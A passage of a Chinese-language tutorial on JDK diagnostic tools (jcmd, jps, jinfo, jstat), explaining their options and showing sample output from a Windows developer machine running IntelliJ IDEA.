<h2 id="jcmd-pid-VM-system-properties：-查看-JVM-的属性信息">jcmd [pid] VM.system_properties： 查看 JVM 的属性信息</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> VM.system_properties
<span class="token number">13204</span>:
<span class="token comment">#Thu Dec 02 11:03:17 CST 2021</span>
<span class="token assign-left variable">java.vendor</span><span class="token operator">=</span>Oracle Corporation
<span class="token assign-left variable">preload.project.path</span><span class="token operator">=</span>D<span class="token punctuation">\</span>:/Workspace/GIT/XXX
<span class="token assign-left variable">sun.java.launcher</span><span class="token operator">=</span>SUN_STANDARD
<span class="token assign-left variable">sun.management.compiler</span><span class="token operator">=</span>HotSpot <span class="token number">64</span>-Bit Tiered Compilers
<span class="token assign-left variable">sun.nio.ch.bugLevel</span><span class="token operator">=</span>
<span class="token assign-left variable">idea.config.path</span><span class="token operator">=</span>C<span class="token punctuation">\</span>:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3
<span class="token assign-left variable">idea.paths.selector</span><span class="token operator">=</span>IntelliJIdea2021.3
<span class="token assign-left variable">kotlin.daemon.client.alive.path</span><span class="token operator">=</span><span class="token string">"C\:<span class="token entity" title="\\">\\</span>Users<span class="token entity" title="\\">\\</span>ADMINI~1<span class="token entity" title="\\">\\</span>AppData<span class="token entity" title="\\">\\</span>Local<span class="token entity" title="\\">\\</span>Temp<span class="token entity" title="\\">\\</span>kotlin-idea-6412110316068151676-is-running"</span>
<span class="token assign-left variable">os.name</span><span class="token operator">=</span>Windows <span class="token number">10</span>
<span class="token assign-left variable">sun.boot.class.path</span><span class="token operator">=</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>resources.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>rt.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>sunrsasign.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>jsse.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>jce.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>charsets.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>lib<span class="token punctuation">\</span><span class="token punctuation">\</span>jfr.jar<span class="token punctuation">;</span>D<span class="token punctuation">\</span>:<span class="token punctuation">\</span><span class="token punctuation">\</span>Developer<span class="token punctuation">\</span><span class="token punctuation">\</span>java<span class="token punctuation">\</span><span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span><span class="token punctuation">\</span>jre<span class="token punctuation">\</span><span class="token punctuation">\</span>classes
<span class="token assign-left variable">sun.desktop</span><span class="token operator">=</span>windows
<span class="token assign-left variable">idea.plugins.path</span><span class="token operator">=</span>C<span class="token punctuation">\</span>:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/plugins
<span class="token assign-left variable">java.vm.specification.vendor</span><span class="token operator">=</span>Oracle Corporation
<span class="token assign-left variable">java.runtime.version</span><span class="token operator">=</span><span class="token number">1.8</span>.0_131-b11
<span class="token assign-left variable">io.netty.serviceThreadPrefix</span><span class="token operator">=</span>Netty
<span class="token assign-left variable">user.name</span><span class="token operator">=</span>Administrator
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="jcmd-pid-VM-flags：-查看-JVM-的启动参数">jcmd [pid] VM.flags： 查看 JVM 的启动参数</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> VM.flags
<span class="token number">13204</span>:
<span class="token parameter variable">-XX:CICompilerCount</span><span class="token operator">=</span><span class="token number">4</span> <span class="token parameter variable">-XX:InitialHeapSize</span><span class="token operator">=</span><span class="token number">268435456</span> <span class="token parameter variable">-XX:MaxHeapSize</span><span class="token operator">=</span><span class="token number">1073741824</span> <span class="token parameter variable">-XX:MaxNewSize</span><span class="token operator">=</span><span class="token number">357564416</span> <span class="token parameter variable">-XX:MinHeapDeltaBytes</span><span class="token operator">=</span><span class="token number">524288</span> <span class="token parameter variable">-XX:NewSize</span><span class="token operator">=</span><span class="token number">89128960</span> <span class="token parameter variable">-XX:OldSize</span><span class="token operator">=</span><span class="token number">179306496</span> <span class="token parameter variable">-XX:+UseCompressedClassPointers</span> <span class="token parameter variable">-XX:+UseCompressedOops</span> <span class="token parameter variable">-XX:+UseFastUnorderedTimeStamps</span> <span class="token parameter variable">-XX:-UseLargePagesIndividualAllocation</span> <span class="token parameter variable">-XX:+UseParallelGC</span>
PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="jcmd-pid-PerfCounter-print：查看-JVM-性能相关的参数">jcmd [pid] PerfCounter.print：查看 JVM 性能相关的参数</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> PerfCounter.print
<span class="token number">13204</span>:
<span class="token assign-left variable">java.ci.totalTime</span><span class="token operator">=</span><span class="token number">26357322</span>
<span class="token assign-left variable">java.cls.loadedClasses</span><span class="token operator">=</span><span class="token number">3480</span>
<span class="token assign-left variable">java.cls.sharedLoadedClasses</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">java.cls.sharedUnloadedClasses</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">java.cls.unloadedClasses</span><span class="token operator">=</span><span class="token number">15</span>
<span class="token assign-left variable">java.property.java.class.path</span><span class="token operator">=</span><span class="token string">"D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-launcher.jar;D:/Developer/java/jdk1.8.0_131/lib/tools.jar"</span>
<span class="token assign-left variable">java.property.java.endorsed.dirs</span><span class="token operator">=</span><span class="token string">""</span>"<span class="token string">"
java.property.java.ext.dirs="</span>D:<span class="token punctuation">\</span>Developer<span class="token punctuation">\</span>java<span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span>jre<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>ext<span class="token punctuation">;</span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Sun<span class="token punctuation">\</span>Java<span class="token punctuation">\</span>lib<span class="token punctuation">\</span>ext<span class="token string">"
java.property.java.home="</span>D:<span class="token punctuation">\</span>Developer<span class="token punctuation">\</span>java<span class="token punctuation">\</span>jdk1.8.0_131<span class="token punctuation">\</span>jre"
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="jcmd-pid-GC-run：执行GC">jcmd [pid] GC.run：执行GC</h2>
<p>对 JVM 执行 java.lang.System.gc()</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> GC.run
<span class="token number">13204</span>:
Command executed successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="jcmd-pid-GC-run-finalization：执行FULL-GC">jcmd [pid] GC.run_finalization：执行FULL GC</h2>
<p>对 JVM 执行 java.lang.System.runFinalization()</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> GC.run_finalization
<span class="token number">13204</span>:
Command executed successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>补充：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">system<span class="token punctuation">.</span><span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>和system<span class="token punctuation">.</span><span class="token function">runFinalization</span><span class="token punctuation">(</span><span class="token punctuation">)</span>区别作用：
  
<span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//告诉垃圾收集器打算进行垃圾收集，而垃圾收集器进不进行收集是不确定的 </span>
<span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">runFinalization</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//强制调用已经失去引用的对象的finalize方法 </span>


<span class="token comment">// java中的finalize()方法</span>
<span class="token comment">// 当垃圾收集器认为没有指向对象实例的引用时，会在销毁该对象之前调用finalize() 方法。</span>
<span class="token comment">// 该方法最常见的作用是确保释放实例占用的全部资源。java并不保证定时为对象实例调用该方法，甚至不保证方法会被调用，所以该方法不应该用于正常内存处理。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="jcmd-pid-VM-command-line：查看-JVM-的启动命令行">jcmd [pid] VM.command_line：查看 JVM 的启动命令行</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jcmd <span class="token number">13204</span> VM.command_line
<span class="token number">13204</span>:
VM Arguments:
jvm_args: <span class="token parameter variable">-Xmx1024m</span> <span class="token parameter variable">-Djava.awt.headless</span><span class="token operator">=</span>true  。。。 <span class="token parameter variable">-Dtmh.generate.line.numbers</span><span class="token operator">=</span>true
java_command: org.jetbrains.jps.cmdline.Launcher D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/jps-builders.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/jps-builders-6.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/jps-javac-extension-1.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/util.jar<span class="token punctuation">;</span>。。。D:/Developer/java/jdk1.8.0_131/lib/tools.jar
Launcher Type: SUN_STANDARD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>jps：列出系统中所有的JAVA应用程序</h1>
<ol>
<li>概述</li>
</ol>
<p>​	jps 命令类似与 linux 的 ps 命令，但是它只列出系统中所有的 Java 应用程序。 通过 jps 命令可以方便地查看 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息。</p>
<p>​	如果在 linux 中想查看 java 的进程，一般我们都需要 ps -ef | grep java 来获取进程 ID。 如果只想获取 Java 程序的进程，可以直接使用 jps 命令来直接查看。</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\Administrator&gt; jps
16208
5712 Jps
13204 Launcher<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="2">
<li>
<p>用法</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\Administrator&gt; jps -help
usage: jps [-help]
       jps [-q] [-mlvV] [&lt;hostid&gt;]

Definitions:
    &lt;hostid&gt;:      &lt;hostname&gt;[:&lt;port&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>参数说明</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-q</td>
<td>只输出进程 ID</td>
</tr>
<tr>
<td>-m</td>
<td>输出传入 main 方法的参数</td>
</tr>
<tr>
<td>-l</td>
<td>输出完全的包名，应用主类名，jar的完全路径名</td>
</tr>
<tr>
<td>-v</td>
<td>输出jvm参数</td>
</tr>
<tr>
<td>-V</td>
<td>输出通过flag文件传递到JVM中的参数</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>示例</p>
<ul>
<li>
<p>jps</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">无参数：显示进程的<span class="token constant">ID</span> 和 启动类的名称。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>jps -q</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">参数 <span class="token operator">-</span>q 只输出进程<span class="token constant">ID</span>，而不显示出类的名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jps <span class="token parameter variable">-q</span>
<span class="token number">16208</span>
<span class="token number">13204</span>
<span class="token number">6132</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>jps -m</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">可以输出传递给 <span class="token class-name">Java</span> 进程（main 方法）的参数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token operator">&gt;</span> jps <span class="token parameter variable">-m</span>
<span class="token number">16208</span>
<span class="token number">10244</span> Jps <span class="token parameter variable">-m</span>
<span class="token number">13204</span> Launcher D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/jps-builders.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/jps-builders-6.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/jps-javac-extension-1.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/util.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/annotations.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/3rd-party-rt.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/jna.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/kotlin-stdlib-jdk8.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/protobuf.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/platform-api.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/jps-model.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/javac2.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/lib/forms_rt.jar<span class="token punctuation">;</span>D:/Developer/JetBrains/IntelliJ IDEA <span class="token number">2021.1</span>.1/plugins/java/lib/qdox.jar<span class="token punctuation">;</span>D:/Developer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>jps -l</p>
<pre class="line-numbers language-none"><code class="language-none">可以输出主函数的完整路径（类的全路径）。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\Administrator&gt; jps -l
16208
13204 org.jetbrains.jps.cmdline.Launcher
5080 sun.tools.jps.Jps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>jsp -v</p>
<pre class="line-numbers language-none"><code class="language-none">可以显示传递给 Java 虚拟机的参数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\Administrator&gt; jps -v
16208  exit -Xms128m -Xmx750m -XX:ReservedCodeCacheSize=512m -XX:+IgnoreUnrecognizedVMOptions -XX:+UseG1GC -XX:SoftRefLRUPolicyMSPerMB=50 -XX:CICompilerCount=2 -XX:+HeapDumpOnOutOfMemoryError -XX:-OmitStackTraceInFastThrow -ea -Dsun.io.useCanonCaches=false -Djdk.http.auth.tunneling.disabledSchemes="" -Djdk.attach.allowAttachSelf=true -Djdk.module.illegalAccess.silent=true -Dkotlinx.coroutines.debug=off -Xms3058m -Xmx5500m -XX:ReservedCodeCacheSize=2048m -XX:SoftRefLRUPolicyMSPerMB=100 -Djb.vmOptionsFile=C:\Users\Administrator\AppData\Roaming\JetBrains\IntelliJIdea2021.3\idea64.exe.vmoptions -Djava.system.class.loader=com.intellij.util.lang.PathClassLoader -Didea.vendor.name=JetBrains -Didea.paths.selector=IntelliJIdea2021.3 -Didea.jre.check=true -Dsplash=true -Dide.native.launcher=true -XX:ErrorFile=C:\Users\Administrator\java_error_in_idea64_%p.log -XX:HeapDumpPath=C:\Users\Administrator\java_error_in_idea64.hprof
6708 RemoteMavenServer36 -Djava.awt.headless=true -Dmaven.defaultProjectBuilder.disableGlobalModelCache=true -Didea.version=2021.3 -Didea.maven.embedder.version=3.8.1 -Xmx1024m -Dmaven.ext.class.path=D:\Developer\JetBrains\IntelliJ IDEA 2021.1.1\plugins\maven\lib\maven-event-listener.jar -Dfile.encoding=GBK
16968 Jps -Dapplication.home=D:\Developer\java\jdk1.8.0_131 -Xms8m
16716 Launcher -Xmx1024m -Djava.awt.headless=true -Djava.endorsed.dirs="" -Dpreload.project.path=D:/Workspace/OWN/Learn -Dpreload.config.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/options -Dexternal.project.config=C:\Users\Administrator\AppData\Local\JetBrains\IntelliJIdea2021.3\external_build_system\learn.11acc208 -Dcompile.parallel=true -Drebuild.on.dependency.change=true -Djdt.compiler.useSingleThread=true -Daether.connector.resumeDownloads=false -Dio.netty.initialSeedUniquifier=1264189494698199162 -Dfile.encoding=GBK -Duser.language=zh -Duser.country=CN -Didea.paths.selector=IntelliJIdea2021.3 -Didea.home.path=D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1 -Didea.config.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3 -Didea.plugins.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/plugins -Djps.log.dir=C:/Users/Administrator/AppData/Local/JetBrains/IntelliJIdea2021.3/log/build-log -Djps.fallback.jdk.home=D:/Developer/JetBrains/IntelliJ IDEA 202<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
</ol>
<h1>jinfo：实时查看和调整虚拟机运行参数</h1>
<p>命令格式 : <strong>jinfo</strong> [option] [args]  <code>LVMID</code></p>
<p>使用<strong>jps</strong>命令的**-v**参数可以查看虚拟机启动时显式指定的参数列表，但如果想知道未被显式指定的参数的系统默认值，除了去找资料外，就只能使用jinfo的-flag选项进行查询了</p>
<p>（如果只限于JDK 1.6或以上版本的话，使用java-XX：+PrintFlagsFinal查看参数默认值也是一个很好的选择），jinfo还可以使用-sysprops选项把虚拟机进程的System.getProperties()的内容打印出来。这个命令在JDK 1.5时期已经随着Linux版的JDK发布，当时只提供了信息查询的功能，JDK 1.6之后，jinfo在Windows和Linux平台都有提供，并且加入了运行期修改参数的能力，可以使用-flag[+|-]name或者-flag name=value修改一部分运行期可写的虚拟机参数值。JDK 1.6中，jinfo对于Windows平台功能仍然有较大限制，只提供了最基本的-flag选项。</p>
<p>option参数:</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-flag</td>
<td>输出指定args参数的值</td>
</tr>
<tr>
<td>-flags</td>
<td>不需要args参数，输出所有JVM参数的值<br><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230425140532043.png" alt="image-20230425140532043"></td>
</tr>
<tr>
<td>-sysprops</td>
<td>输出系统属性，等同于System.getProperties()</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h1>jstat：虚拟机统计信息监视工具</h1>
<blockquote>
<p>它可以显示出虚拟机进程中的类装载、内存、垃圾收集、JIT编译等运行数据。</p>
</blockquote>
<p>命令格式<br>
：  <strong>jstat</strong> [option] <code>LVMID</code> [interval] [count]</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>[option]</td>
<td>操作参数</td>
</tr>
<tr>
<td>LVMID</td>
<td>本地虚拟机进程ID</td>
</tr>
<tr>
<td>[interval]</td>
<td>连续输出的时间间隔</td>
</tr>
<tr>
<td>[count]</td>
<td>连续输出的次数</td>
</tr>
</tbody>
</table>
<p>对于命令格式中的VMID与LVMID需要特别说明一下：<br>
如果是本地虚拟机进程，VMID与LVMID是一致的;</p>
<p>如果是远程虚拟机进程，那LVMID的格式应当是：protocol://lvmid@hostname:port/servername</p>
<p><strong>参数interval和count代表查询间隔(单位毫秒)和次数，如果省略这两个参数，说明只查询一次。</strong></p>
<p>举例：假设需要每250毫秒查询一次进程2764垃圾收集状况，一共查询20次，那命令应当是：<code>jstat -gc 2764 250 20</code></p>
<p>选项option代表着用户希望查询的虚拟机信息，主要分为3类：类装载、垃圾收集、运行期编译状况，具体选项及作用请参考表4-3中的描述。</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424171605151.png" alt="image-20230424171605151"></p>
<p>option 参数详解</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>-class</strong>：监视类装载、卸载数量、总空间以及耗费的时间</td>
<td><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424171946376-1682328214575-4-1682328278125-7.png" alt="image-20230424171946376"><br><br>Loaded : 加载class的数量<br>Bytes : class字节大小<br>Unloaded : 未加载class的数量<br>Bytes : 未加载class的字节大小<br>Time : 加载时间</td>
</tr>
<tr>
<td><strong>-compiler</strong>：输出JIT编译过的方法数量耗时等</td>
<td><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424172122535-1682328140305-1-1682328290986-10.png" alt="image-20230424172122535"><br><br><br>Compiled : 编译数量 <br>Failed : 编译失败数量 <br>Invalid : 无效数量 <br>Time : 编译耗时 <br>FailedType : 失败类型 <br>FailedMethod : 失败方法的全限定名</td>
</tr>
<tr>
<td><strong>-gc</strong>：垃圾回收堆的行为统计</td>
<td>DEMO：每250毫秒查询一次进程2764垃圾收集状况，一共查询20次：<br><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424172539124-1682328346591-13.png" alt="image-20230424172539124"><br><br>新生代Eden区（E，表示Eden）使用了6.2%的空间<br>两个Survivor区（S0、S1，表示Survivor0、Survivor1）里面都是空的<br>老年代（O，表示Old）和永久代（P，表示Permanent）则分别使用了41.42%和47.20%的空间。<br>程序运行以来共发生Minor GC（YGC，表示Young GC）16次，总耗时0.105秒，<br>发生Full GC（FGC，表示Full GC）3次，Full GC总耗时（FGCT，表示Full GC Time）为0.472秒，<br>所有GC总耗时（GCT，表示GC Time)为0.577秒。<br><br><br>C 即Capacity 总容量，U 即Used 已使用的容量.<br><strong>S0C</strong> : survivor0区的总容量 <br><strong>S1C</strong> : survivor1区的总容量 <br><strong>S0U</strong> : survivor0区已使用的容量 <br><strong>S1C</strong> : survivor1区已使用的容量 <br><strong>EC</strong> : Eden区的总容量 <br><strong>EU</strong> : Eden区已使用的容量 <br><strong>OC</strong> : Old区的总容量 <br><strong>OU</strong> : Old区已使用的容量 <br><strong>PC</strong> 当前perm的容量 (KB) <br><strong>PU</strong> perm的使用 (KB) <br><strong>YGC</strong> : 新生代垃圾回收次数 <br><strong>YGCT</strong> : 新生代垃圾回收时间 <br><strong>FGC</strong> : 老年代垃圾回收次数 <br><strong>FGCT</strong> : 老年代垃圾回收时间 <br><strong>GCT</strong> : 垃圾回收总消耗时间</td>
</tr>
<tr>
<td><strong>-gccapacity</strong>：同-gc，不过还会输出Java堆各区域使用到的最大、最小空间</td>
<td>jstat -gccapacity 1262<br><br><strong>NGCMN</strong> : 新生代占用的最小空间 <br><strong>NGCMX</strong> : 新生代占用的最大空间 <br><strong>OGCMN</strong> : 老年代占用的最小空间 <br><strong>OGCMX</strong> : 老年代占用的最大空间 <br><strong>OGC</strong>：当前年老代的容量 (KB) <br><strong>OC</strong>：当前年老代的空间 (KB) <br><strong>PGCMN</strong> : perm占用的最小空间 <br><strong>PGCMX</strong> : perm占用的最大空间</td>
</tr>
<tr>
<td><strong>-gcutil</strong>：同-gc，不过输出的是已使用空间占总空间的百分比</td>
<td></td>
</tr>
<tr>
<td><strong>-gccause</strong>： 垃圾收集统计概述（同-gcutil），附加最近两次垃圾回收事件的原因</td>
<td><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424173514901-1682328923881-17.png" alt="image-20230424173514901"> <br><strong>LGCC</strong>：最近垃圾回收的原因<br><strong>GCC</strong>：当前垃圾回收的原因</td>
</tr>
<tr>
<td><strong>-gcnew</strong>：统计新生代的行为</td>
<td><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20230424174422588-1682329539903-20.png" alt="image-20230424174422588"> <br><br><strong>TT</strong>：Tenuring threshold(提升阈值)<br><strong>MTT</strong>：最大的tenuring threshold<br><strong>DSS</strong>：survivor区域大小 (KB)</td>
</tr>
<tr>
<td><strong>-gcnewcapacity</strong>：新生代与其相应的内存空间的统计</td>
<td>jstat -gcnewcapacity 28920 <br><br>NGC:当前年轻代的容量 (KB)<br>S0CMX:最大的S0空间 (KB)<br>S0C:当前S0空间 (KB)<br>ECMX:最大eden空间 (KB)<br>EC:当前eden空间 (KB)</td>
</tr>
<tr>
<td><strong>-gcold</strong>：统计旧生代的行为</td>
<td>jstat -gcold 28920</td>
</tr>
<tr>
<td><strong>-gcoldcapacity</strong>：统计旧生代的大小和空间</td>
<td>jstat -gcoldcapacity 28920</td>
</tr>
<tr>
<td><strong>-gcpermcapacity</strong>：永生代行为统计</td>
<td>jstat -gcpermcapacity 28920</td>
</tr>
<tr>
<td><strong>-printcompilation</strong>：hotspot编译方法统计</td>
